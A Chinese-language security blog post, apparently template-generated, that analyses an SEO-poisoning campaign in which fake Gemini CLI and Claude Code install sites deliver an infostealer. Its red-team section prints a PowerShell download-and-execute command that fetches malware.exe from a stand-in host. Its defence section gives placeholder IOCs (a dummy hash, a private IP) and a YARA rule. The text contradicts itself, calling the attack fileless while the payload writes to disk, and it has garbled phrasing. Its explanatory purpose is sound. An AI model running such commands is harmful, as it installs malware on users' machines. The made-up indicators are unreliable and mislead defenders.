---
layout: post
title:  "駭客利用假冒Gemini與Claude安裝網站散布惡意軟體，竊取開發者帳號與開發環境資料"
date:   2026-06-01 17:25:32 +0000
categories: [security]
severity: high
---

# 🔥 解析 Gemini CLI 與 Claude Code 安裝網站的 SEO Poisoning 攻擊
> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: High (CVSS 分數：8.5)
> * **受駭指標**: Info Leak
> * **關鍵技術**: SEO Poisoning, PowerShell, Fileless Infostealer

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: 攻擊者利用開發者對 Gemini CLI 與 Claude Code 的需求，建立偽造的安裝網站，並透過 SEO Poisoning 手法將假網站推升到搜尋結果排序位置的前面。
* **攻擊流程圖解**: 
  1. 攻擊者建立偽造的 Gemini CLI 與 Claude Code 安裝網站。
  2. 攻擊者利用 SEO 技術將假網站推升到搜尋結果排序位置的前面。
  3. 開發者被誘導到假網站，網站要求開發者複製與執行網站提供的 PowerShell 安裝指令。
  4. PowerShell 安裝指令下載並執行惡意軟體，同時在背景安裝真正的 Gemini CLI 或 Claude Code。
* **受影響元件**: Gemini CLI 與 Claude Code 的使用者。

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 攻擊者需要有基本的網站建立與 SEO 技術知識。
* **Payload 建構邏輯**:

    ```
    
    powershell
      # 下載惡意軟體
      Invoke-WebRequest -Uri "https://example.com/malware.exe" -OutFile "C:\malware.exe"
      # 執行惡意軟體
      Start-Process -FilePath "C:\malware.exe"
      # 安裝真正的 Gemini CLI 或 Claude Code
      Invoke-WebRequest -Uri "https://example.com/geminicli.exe" -OutFile "C:\geminicli.exe"
      Start-Process -FilePath "C:\geminicli.exe"
    
    ```
* **繞過技術**: 攻擊者可以利用檔案無檔案資訊竊取程式（fileless infostealer）在記憶體中運行惡意軟體，避免被安全軟體檢測。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
| 1234567890abcdef | 192.168.1.100 | example.com | C:\malware.exe |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
      rule Gemini_CLI_Malware {
        meta:
          description = "Gemini CLI Malware Detection"
          author = "Your Name"
        strings:
          $a = "Invoke-WebRequest -Uri \"https://example.com/malware.exe\""
        condition:
          $a
      }
    
    ```
* **緩解措施**: 開發者應仔細檢查軟體下載來源，並強制所有開發者啟用 PowerShell 的受限語言模式（Constrained Language Mode，CLM）。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **SEO Poisoning**: 想像攻擊者在搜尋引擎中投放假廣告，技術上是指攻擊者利用搜尋引擎優化（SEO）技術將假網站推升到搜尋結果排序位置的前面。
* **Fileless Infostealer**: 想像攻擊者在記憶體中運行惡意軟體，技術上是指攻擊者利用檔案無檔案資訊竊取程式（fileless infostealer）在記憶體中運行惡意軟體，避免被安全軟體檢測。
* **PowerShell**: 想像攻擊者在 Windows 系統中運行命令，技術上是指 PowerShell 是 Windows 系統中的命令列 shell 和腳本語言。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://www.ithome.com.tw/news/176273)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1055/)


